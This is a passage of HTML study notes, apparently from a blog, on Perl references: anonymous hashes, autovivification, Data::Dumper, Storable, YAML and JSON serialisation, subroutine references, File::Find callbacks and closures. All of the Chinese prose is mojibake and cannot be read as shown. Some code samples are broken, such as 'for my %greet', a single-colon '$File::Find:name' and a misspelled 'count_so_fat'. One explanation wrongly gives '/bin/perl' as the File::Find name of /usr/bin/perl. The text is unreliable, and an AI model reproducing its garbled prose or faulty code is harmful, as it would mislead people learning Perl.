     <span class="hljs-string">shirt      =&gt;</span> <span class="hljs-string">&#x27;Blue&#x27;</span>,<br>        <span class="hljs-string">position   =&gt;</span> <span class="hljs-string">&#x27;Captain&#x27;</span>,<br>    &#125;,<br>        )<br></code></pre></td></tr></table></figure><p>å‘ç¼–è¯‘å™¨è¯´æ˜æˆ‘ä»¬æƒ³è¦ä¸€ä¸ªåŒ¿åæ•£åˆ—æ„é€ å‡½æ•°, å°±åœ¨å·¦å¤§æ‹¬å·ä¹‹å‰æ”¾ç½®ä¸€ä¸ªåŠ å·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">+&#123;...&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³å¾—åˆ°ä¸€ä¸ªä»£ç å—, å°±åœ¨è¯­å¥å—å¼€å§‹å¤„æ”¾ç½®ä¸€ä¸ªåˆ†å·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;; ...&#125;<br></code></pre></td></tr></table></figure><h2 id="5-7-è‡ªåŠ¨å¸¦å…¥"><a href="#5-7-è‡ªåŠ¨å¸¦å…¥" class="headerlink" title="5.7 è‡ªåŠ¨å¸¦å…¥"></a>5.7 è‡ªåŠ¨å¸¦å…¥</h2><h2 id="5-8-è‡ªåŠ¨å¸¦å…¥å’Œæ•£åˆ—"><a href="#5-8-è‡ªåŠ¨å¸¦å…¥å’Œæ•£åˆ—" class="headerlink" title="5.8 è‡ªåŠ¨å¸¦å…¥å’Œæ•£åˆ—"></a>5.8 è‡ªåŠ¨å¸¦å…¥å’Œæ•£åˆ—</h2><p>è‡ªåŠ¨å¸¦å…¥çš„ä¸€ä¸ªä¾¿æ·ä¹‹å¤„åœ¨äºå…¸å‹çš„æ•°æ®å‹ç¼©ä»»åŠ¡.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %total_bytes;<br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>    <span class="hljs-keyword">my</span> ($source, $destination, $bytes) = <span class="hljs-keyword">split</span>;<br>    $total_bytes&#123;$source&#125;&#123;$destination&#125; += $bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤å¤„ä¸¤ä¸ªå¤§æ‹¬å·é—´æœ‰éšå¼çš„ç®­å¤´.</p><h1 id="ç¬¬6ç« -æ“ä½œå¤æ‚çš„æ•°æ®ç»“æ„"><a href="#ç¬¬6ç« -æ“ä½œå¤æ‚çš„æ•°æ®ç»“æ„" class="headerlink" title="ç¬¬6ç«  æ“ä½œå¤æ‚çš„æ•°æ®ç»“æ„"></a>ç¬¬6ç«  æ“ä½œå¤æ‚çš„æ•°æ®ç»“æ„</h1><h2 id="6-1-ä½¿ç”¨è°ƒè¯•å™¨æŸ¥çœ‹å¤æ‚çš„æ•°æ®"><a href="#6-1-ä½¿ç”¨è°ƒè¯•å™¨æŸ¥çœ‹å¤æ‚çš„æ•°æ®" class="headerlink" title="6.1 ä½¿ç”¨è°ƒè¯•å™¨æŸ¥çœ‹å¤æ‚çš„æ•°æ®"></a>6.1 ä½¿ç”¨è°ƒè¯•å™¨æŸ¥çœ‹å¤æ‚çš„æ•°æ®</h2><p>æœ€ç®€å•çš„ä¸€ç§æ˜¯åœ¨å‘½ä»¤è¡Œæ¡ä»¶ä¸‹è°ƒç”¨ perl å¹¶å¸¦ä¸Š <code>-d</code> å‚æ•°.</p><p>æ¯ä¸ªæ–°å‘å¸ƒçš„è°ƒè¯•å™¨éƒ½ä¸ä¹‹å‰å‘å¸ƒçš„è°ƒè¯•å™¨åœ¨å·¥ä½œæ–¹å¼ä¸Šç•¥æœ‰ä¸åŒ.</p><p>æœ‰ä»»ä½•é—®é¢˜éƒ½å¯ä»¥é€šè¿‡è¾“å…¥ <code>h</code> æˆ–è€…æŸ¥çœ‹ <code>perldebug</code> æ–‡æ¡£.</p><p>è°ƒè¯•å™¨ä¼šåœ¨æ‰§è¡Œå‰æ˜¾ç¤ºæ¯ä¸€è¡Œæ­£åœ¨è°ƒè¯•çš„ä»£ç .</p><p><code>s</code> å‘½ä»¤å°†å•æ­¥æ‰§è¡Œç¨‹åº.</p><p><code>x</code> å‘½ä»¤æ˜¾ç¤ºå­˜å‚¨åœ¨åˆ—è¡¨ä¸­çš„æ‰€æœ‰å€¼.</p><h2 id="6-2-ä½¿ç”¨-Data-Dumper-æ¨¡å—æŸ¥çœ‹å¤æ‚çš„æ•°æ®"><a href="#6-2-ä½¿ç”¨-Data-Dumper-æ¨¡å—æŸ¥çœ‹å¤æ‚çš„æ•°æ®" class="headerlink" title="6.2 ä½¿ç”¨ Data::Dumper æ¨¡å—æŸ¥çœ‹å¤æ‚çš„æ•°æ®"></a>6.2 ä½¿ç”¨ Data::Dumper æ¨¡å—æŸ¥çœ‹å¤æ‚çš„æ•°æ®</h2><p>Data::Dumper å°† Perl çš„æ•°æ®ç»“æ„æ˜¾ç¤ºä¸º Perl ä»£ç .</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dumper;<br><br><span class="hljs-keyword">my</span> %total_bytes;<br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>    <span class="hljs-keyword">my</span> ($source, $destination, $bytes) = <span class="hljs-keyword">split</span>;<br>    $total_bytes&#123;$source&#125;&#123;$destination&#125; += $bytes;<br>&#125;<br><br><span class="hljs-keyword">print</span> Dumper(\%total_bytes);<br></code></pre></td></tr></table></figure><p>Data::Dumper æ¨¡å—å®šä¹‰çš„ Dumper å­ä¾‹ç¨‹ç±»ä¼¼ä¸è°ƒè¯•å™¨ä¸­çš„ <code>x</code> å‘½ä»¤. å…¶ä¸ <code>x</code> å‘½ä»¤çš„åŒºåˆ«åœ¨äº, Dumper ç”Ÿæˆçš„å­—ç¬¦ä¸²æ˜¯ Perl ä»£ç .</p><h3 id="å…¶ä»–å½¢å¼çš„è½¬å‚¨ç¨‹åº"><a href="#å…¶ä»–å½¢å¼çš„è½¬å‚¨ç¨‹åº" class="headerlink" title="å…¶ä»–å½¢å¼çš„è½¬å‚¨ç¨‹åº"></a>å…¶ä»–å½¢å¼çš„è½¬å‚¨ç¨‹åº</h3><p>Data::Dump æ¨¡å—æœ‰ä¸€ä¸ªå«åš dump çš„å­ä¾‹ç¨‹, ä¸ Data::Dumper æ¨¡å—çš„ç”¨æ³•ä¸€è‡´.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dump <span class="hljs-string">qw(dump)</span>;<br><span class="hljs-keyword">dump</span>( \%total_bytes );<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Printer;<br>p( %total_bytes );<br></code></pre></td></tr></table></figure><p>Data::Printer æ¨¡å—çš„ p å­ä¾‹ç¨‹ä¸éœ€è¦ä¸€ä¸ªå¼•ç”¨ä½œä¸ºå‚æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Printer;<br><br>p( %total_bytes );<br></code></pre></td></tr></table></figure><h2 id="6-3-æ•°æ®ç¼–ç»„"><a href="#6-3-æ•°æ®ç¼–ç»„" class="headerlink" title="6.3 æ•°æ®ç¼–ç»„"></a>6.3 æ•°æ®ç¼–ç»„</h2><p>èƒ½å¤Ÿå°† Data::Dumper æ¨¡å— Dumper å­è¿›ç¨‹çš„è¾“å‡ºæ”¾å…¥ä¸€ä¸ªæ–‡ä»¶ä¸­, ç„¶åå¦ä¸€ä¸ªç¨‹åºåŠ è½½è¯¥æ–‡ä»¶.</p><h3 id="6-3-1-ä½¿ç”¨-Storable-æ¨¡å—å¯¹å¤æ‚æ•°æ®æ’åº"><a href="#6-3-1-ä½¿ç”¨-Storable-æ¨¡å—å¯¹å¤æ‚æ•°æ®æ’åº" class="headerlink" title="6.3.1 ä½¿ç”¨ Storable æ¨¡å—å¯¹å¤æ‚æ•°æ®æ’åº"></a>6.3.1 ä½¿ç”¨ Storable æ¨¡å—å¯¹å¤æ‚æ•°æ®æ’åº</h3><p>ç¼–ç»„æ•°æ®: å°†å¤æ‚æ•°æ®è½¬æ¢æˆä¸€ç§èƒ½å¤Ÿä½œä¸ºå­—èŠ‚æµå†™å…¥æ–‡ä»¶çš„ä¸€ç§å½¢å¼.</p><p>Perl çš„ Storable æ¨¡å—æ›´é€‚åˆç¼–ç»„æ•°æ®.</p><p>Storable ç”Ÿæˆæ›´çŸ­å°å¹¶ä¸”æ˜“äºå¤„ç†çš„æ–‡ä»¶.</p><p>freeze å­ä¾‹ç¨‹è¿”å›ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸², è¯¥å­—ç¬¦ä¸²ç”¨äºè¡¨è¿°æ‰€éœ€è¦è¾“å‡ºçš„æ•°æ®ç»“æ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Storable;<br><span class="hljs-keyword">my</span> @data1 = <span class="hljs-string">qw(one won)</span>;<br><span class="hljs-keyword">my</span> @data2 = <span class="hljs-string">qw(two too to)</span>;<br><span class="hljs-keyword">push</span> @data2, \@data1;<br><span class="hljs-keyword">push</span> @data1, \@data2;<br><span class="hljs-keyword">my</span> $frozen = freeze [\@data1, \@data2];<br></code></pre></td></tr></table></figure><h3 id="6-3-2-YAML-æ¨¡å—"><a href="#6-3-2-YAML-æ¨¡å—" class="headerlink" title="6.3.2 YAML æ¨¡å—"></a>6.3.2 YAML æ¨¡å—</h3><p>YAML (Yet Another Mark Language).</p><p>YAML æ¨¡å—çš„å·¥ä½œæ–¹å¼ä¸ Data::Dumper æ¨¡å—ç›¸åŒ.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"> <span class="hljs-keyword">use</span> YAML;<br><br> <span class="hljs-keyword">my</span> %total_bytes;<br><br> <span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>     <span class="hljs-keyword">my</span> ($source, $destination, $bytes) = <span class="hljs-keyword">split</span>;<br>     $total_bytes&#123;$source&#125;&#123;$destination&#125; += $bytes;<br>&#125;<br><br><span class="hljs-keyword">print</span> Dump(\%total_bytes);<br></code></pre></td></tr></table></figure><h3 id="6-3-3-JSON-æ¨¡å—"><a href="#6-3-3-JSON-æ¨¡å—" class="headerlink" title="6.3.3 JSON æ¨¡å—"></a>6.3.3 JSON æ¨¡å—</h3><p>JSON (JavaScript Object Notation).</p><p>JSON æ¨¡å—æœ‰å¾ˆå¤šä¸­åˆ›å»ºè¾“å‡ºçš„æ–¹æ³•, å…¶ä¸­å°±åŒ…æ‹¬ <code>to_json</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> JSON;<br><br><span class="hljs-keyword">print</span> to_json( \%total_bytes, &#123; <span class="hljs-string">pretty =&gt;</span> <span class="hljs-number">1</span> &#125; );<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>&#123; pretty =&gt; 1 &#125;</code> æ˜¯ä½¿ç”¨å±æ€§.</p><p>å¯ä»¥ä»ä¸€ä¸ªæ–‡ä»¶, Web è¯·æ±‚æˆ–è€…æ¥è‡ªå…¶ä»–ç¨‹åºçš„è¾“å‡ºè·å– JSON æ–‡æœ¬:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> JSON;<br><br><span class="hljs-keyword">my</span> $hash_ref = from_json($json_string);<br></code></pre></td></tr></table></figure><h2 id="6-4-ä½¿ç”¨-map-å’Œ-grep-æ“ä½œç¬¦"><a href="#6-4-ä½¿ç”¨-map-å’Œ-grep-æ“ä½œç¬¦" class="headerlink" title="6.4 ä½¿ç”¨ map å’Œ grep æ“ä½œç¬¦"></a>6.4 ä½¿ç”¨ map å’Œ grep æ“ä½œç¬¦</h2><h2 id="6-5-åº”ç”¨ä¸€ç‚¹é—´æ¥æ–¹æ³•"><a href="#6-5-åº”ç”¨ä¸€ç‚¹é—´æ¥æ–¹æ³•" class="headerlink" title="6.5 åº”ç”¨ä¸€ç‚¹é—´æ¥æ–¹æ³•"></a>6.5 åº”ç”¨ä¸€ç‚¹é—´æ¥æ–¹æ³•</h2><h1 id="ç¬¬7ç« -å¯¹å­ä¾‹ç¨‹çš„å¼•ç”¨"><a href="#ç¬¬7ç« -å¯¹å­ä¾‹ç¨‹çš„å¼•ç”¨" class="headerlink" title="ç¬¬7ç«  å¯¹å­ä¾‹ç¨‹çš„å¼•ç”¨"></a>ç¬¬7ç«  å¯¹å­ä¾‹ç¨‹çš„å¼•ç”¨</h1><p>é™¤äº†å¯¹æ ‡é‡, æ•°ç»„å’Œæ•£åˆ—çš„å¼•ç”¨, ä¹Ÿå¯ä»¥å¯¹ä¸€ä¸ªå­ä¾‹ç¨‹è¿›è¡Œå¼•ç”¨.k</p><h2 id="7-1-å¯¹å‘½åå­ä¾‹ç¨‹çš„å¼•ç”¨"><a href="#7-1-å¯¹å‘½åå­ä¾‹ç¨‹çš„å¼•ç”¨" class="headerlink" title="7.1 å¯¹å‘½åå­ä¾‹ç¨‹çš„å¼•ç”¨"></a>7.1 å¯¹å‘½åå­ä¾‹ç¨‹çš„å¼•ç”¨</h2><p>å¯¹å­ä¾‹ç¨‹ <code>skipper_greets()</code> å–å¼•ç”¨, å‰å¯¼å­—ç¬¦ â€œ&amp;â€ åœ¨è¿™é‡Œæ˜¯å¿…é¡»çš„, ä½†åˆ é™¤äº†å…¶åçš„å°æ‹¬å·.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_greeter = \&amp;skipper_greets;<br></code></pre></td></tr></table></figure><p>è§£å¼•ç”¨åŒæ ·æ˜¯åŠ å¤§æ‹¬å·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&amp;&#123; $ref_to_greeter &#125;( <span class="hljs-string">&#x27;Gilligan&#x27;</span> )<br></code></pre></td></tr></table></figure><p>åŒæ ·, å¦‚æœå¤§æ‹¬å·é‡Œçš„å€¼æ˜¯ç®€å•çš„æ ‡é‡å˜é‡, å¤§æ‹¬å·å¯ä»¥åˆ é™¤:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&amp; $ref_to_greeter( <span class="hljs-string">&#x27;Gilligan&#x27;</span> )<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è½¬æ¢æˆå¸¦ç®­å¤´çš„å½¢å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$ref_to_greeter -&gt; ( <span class="hljs-string">&#x27;Gilligan&#x27;</span> )<br></code></pre></td></tr></table></figure><p>è¿­ä»£è°ƒç”¨æ‰€æœ‰å­ä¾‹ç¨‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> <span class="hljs-keyword">my</span> %greet (\&amp;skipper_greets, \&amp;gilligan_greets) &#123;<br>    $greet-&gt;(<span class="hljs-string">&#x27;Professor&#x27;</span>);<br>&#125;    <br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´, ç”¨å­ä¾‹ç¨‹çš„å¼•ç”¨çš„ä¸€ä¸ªå¥½å¤„å°±æ˜¯, å½“å­ä¾‹ç¨‹è°ƒç”¨çš„å‚æ•°ç›¸åŒæ—¶, å¯ä»¥åˆ©ç”¨æ§åˆ¶ç»“æ„ç®€åŒ–æ“ä½œ.</p><h2 id="7-2-åŒ¿åå­ä¾‹ç¨‹"><a href="#7-2-åŒ¿åå­ä¾‹ç¨‹" class="headerlink" title="7.2 åŒ¿åå­ä¾‹ç¨‹"></a>7.2 åŒ¿åå­ä¾‹ç¨‹</h2><p>åŒ¿åå­ä¾‹ç¨‹çœ‹ä¸Šå»åƒæ˜¯æ™®é€šå­ä¾‹ç¨‹, åªæ˜¯åœ¨ sub å…³é”®å­—å’Œç´§éšçš„ä»£ç å—ä¹‹é—´æ²¡æœ‰åå­—, æœ€åæœ‰ä¸€ä¸ªåˆ†å·, æ¯•ç«Ÿæ˜¯ä¸€ä¸ªèµ‹å€¼è¯­å¥, å…¶è¿”å›ä¸€ä¸ªå­ä¾‹ç¨‹çš„å¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ginger = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $person = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Ginger: (in a sultry voice) Well hello, $person!\n&quot;</span>;<br>&#125;;<br>$ginger-&gt;(<span class="hljs-string">&#x27;Skipper&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-3-å›è°ƒ"><a href="#7-3-å›è°ƒ" class="headerlink" title="7.3 å›è°ƒ"></a>7.3 å›è°ƒ</h2><p>File::Find æ¨¡å—å¯¼å‡ºçš„ find å­ä¾‹ç¨‹, ç”¨æ¥ä»¥å¯ç§»æ¤çš„æ–¹å¼éå†ç»™å®šæ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„. ä¼ é€’ç»™ find å­ä¾‹ç¨‹ä¸¤ä¸ªå‚æ•°:  ç¬¬ä¸€ä¸ªæ˜¯å¯¹å­ä¾‹ç¨‹çš„å¼•ç”¨. è¯¥å­ä¾‹ç¨‹ä¼šä»ç»™å®šçš„èµ·å§‹ç›®å½•å¼€å§‹, é€šè¿‡é€’å½’æœç´¢çš„æ–¹æ³•, æ‰¾åˆ°å…¶ä¸‹çš„æ¯ä¸ªæ–‡ä»¶æˆ–ç›®å½•, æ‰§è¡Œå­ä¾‹ç¨‹å¼•ç”¨ä¸‹çš„æ“ä½œ, ç¬¬äºŒä¸ªè¡¨ç¤ºç›®å½•å¼€å§‹ç‚¹çš„å­—ç¬¦ä¸²:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">what_to_do</span> </span>&#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$File::Find::name found\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">my</span> @starting_directories = <span class="hljs-string">qw(.)</span>;<br><br>find(\&amp;what_to_do, @starting_directories);<br></code></pre></td></tr></table></figure><p>æ”¹ç”¨åŒ¿åå­ä¾‹ç¨‹çš„æ–¹å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br>find(<br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$File::Find:name found\n&quot;</span>;<br>    &#125;,<br>    @starting_directories,<br>);<br></code></pre></td></tr></table></figure><h2 id="7-4-é—­åŒ…"><a href="#7-4-é—­åŒ…" class="headerlink" title="7.4 é—­åŒ…"></a>7.4 é—­åŒ…</h2><p>è¿˜å¯ä»¥ç”¨ File::Find æ¥æŸ¥æ‰¾æ–‡ä»¶çš„ä¸€äº›å…¶ä»–å±æ€§.</p><p><code>$_</code> ä¸­ä¿å­˜çš„æ˜¯æ–‡ä»¶å, è€Œ <code>File::Find::name</code> ä¸­ä¿å­˜çš„æ˜¯ç›¸å¯¹äºèµ·å§‹è·¯å¾„çš„æ–‡ä»¶å. å¦‚, è‹¥èµ·å§‹ç›®å½•ä¸º <code>/usr</code>, æŸ¥æ‰¾çš„æ–‡ä»¶ä¸º <code>/usr/bin/perl</code>, é‚£ä¹ˆ <code>$_</code> ä¸­çš„å€¼ä¸º <code>perl</code> è€Œ <code>$File::Find::name</code> çš„å€¼ä¸º <code>/bin/perl</code>.</p><p>èƒ½å¤Ÿè®¿é—®å£°æ˜æ—¶å°±å­˜åœ¨çš„æ‰€æœ‰è¯æ³•å˜é‡çš„å­ä¾‹ç¨‹å«åšé—­åŒ…. (ä¹Ÿå°±æ˜¯è¯´å˜é‡æ˜¯åœ¨å­ä¾‹ç¨‹å¤–é¢å£°æ˜çš„).</p><p>ä»é—­åŒ…å†…éƒ¨è®¿é—®å˜é‡èƒ½å¤Ÿç¡®ä¿åªè¦å­ä¾‹ç¨‹å¼•ç”¨å­˜åœ¨, è®¿é—®çš„å˜é‡å°±å­˜åœ¨.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br><span class="hljs-keyword">my</span> $callback;<br>&#123;<br>    <span class="hljs-keyword">my</span> $count = <span class="hljs-number">0</span>;<br>    $callback = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">print</span> ++$count, <span class="hljs-string">&quot;: $File::Find::name\n&quot;</span> &#125;;<br>&#125;<br>find($callback, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-5-ä»ä¸€ä¸ªå­ä¾‹ç¨‹è¿”å›å¦ä¸€ä¸ªå­ä¾‹ç¨‹"><a href="#7-5-ä»ä¸€ä¸ªå­ä¾‹ç¨‹è¿”å›å¦ä¸€ä¸ªå­ä¾‹ç¨‹" class="headerlink" title="7.5 ä»ä¸€ä¸ªå­ä¾‹ç¨‹è¿”å›å¦ä¸€ä¸ªå­ä¾‹ç¨‹"></a>7.5 ä»ä¸€ä¸ªå­ä¾‹ç¨‹è¿”å›å¦ä¸€ä¸ªå­ä¾‹ç¨‹</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">create_find_callback_that_counts</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">print</span> ++$count, <span class="hljs-string">&quot;: $File::Find::name\n&quot;</span> &#125;;<br>&#125;<br><br><span class="hljs-keyword">my</span> $callback = create_find_callback_that_counts();<br>find($callback, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-6-ä½œä¸ºè¾“å…¥å‚æ•°çš„é—­åŒ…å˜é‡"><a href="#7-6-ä½œä¸ºè¾“å…¥å‚æ•°çš„é—­åŒ…å˜é‡" class="headerlink" title="7.6 ä½œä¸ºè¾“å…¥å‚æ•°çš„é—­åŒ…å˜é‡"></a>7.6 ä½œä¸ºè¾“å…¥å‚æ•°çš„é—­åŒ…å˜é‡</h2><p>é—­åŒ…å˜é‡ä¹ŸåŒæ ·å¯ä»¥ç”¨äºä¸ºå­ä¾‹ç¨‹æä¾›åˆå§‹å˜é‡æˆ–è€…æŒç»­è¾“å…¥.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">print_bigger_than</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $minimum_size = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$File::Find::name\n&quot;</span> <span class="hljs-keyword">if</span> -f <span class="hljs-keyword">and</span> -s &gt;= $minimum_size &#125;;<br>&#125;<br><br><span class="hljs-keyword">my</span> $bigger_than_1024 = print_bigger_than(<span class="hljs-number">1024</span>);<br>find($bigger_than_1024, <span class="hljs-string">&#x27;bin&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-7-é—­åŒ…å˜é‡ä½œä¸ºé™æ€å±€éƒ¨å˜é‡"><a href="#7-7-é—­åŒ…å˜é‡ä½œä¸ºé™æ€å±€éƒ¨å˜é‡" class="headerlink" title="7.7 é—­åŒ…å˜é‡ä½œä¸ºé™æ€å±€éƒ¨å˜é‡"></a>7.7 é—­åŒ…å˜é‡ä½œä¸ºé™æ€å±€éƒ¨å˜é‡</h2><p>å‘½åå­ä¾‹ç¨‹ä¹Ÿå¯ä»¥æ˜¯é—­åŒ….</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-keyword">my</span> $count;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">count_one</span> </span>&#123; ++$count &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">count_so_fat</span> </span>&#123; <span class="hljs-keyword">return</span> $count &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å­ä¾‹ç¨‹åœ¨ä½œç”¨åŸŸå¤–ä»å°†ä¿æŒ. ä¹Ÿå°±æ˜¯è¯´, ä¸Šé¢è™½ç„¶æ˜¯åœ¨ä¸€ä¸ªä»£ç å—ä¸­, å¤–é¢çš„ç¨‹åºä»ç„¶èƒ½å¤Ÿä½¿ç”¨è¿™ä¸¤ä¸ªå­ä¾‹ç¨‹.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-keyword">my</span> $countdown = <span class="hljs-number">10</span>;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">count_down</span> </span>&#123; $countdown-- &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">count_remaining</span> </span>&#123; $countdown &#125;<br>&#125;<br><br>count_down();<br>count_down();<br>count_down();<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;we&#x27;re down to &quot;</span>, count_remaining(), <span class="hljs-string">&quot; coconuts!\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>å®æµ‹åŠ ä¸Š BEGIN ç»“æœä¹Ÿæ˜¯ä¸€æ ·çš„?</p><h3 id="state-å˜é‡"><a href="#state-å˜é‡" class="headerlink" title="state å˜é‡"></a>state å˜é‡</h3><p>Perl v5.10 ç‰ˆå¼€å§‹ä¸ºå­ä¾‹ç¨‹å¼•å…¥äº†å¦ä¸€ç§æ–¹æ³•ç”Ÿæˆç§æœ‰çš„, æŒç»­çš„å˜é‡. 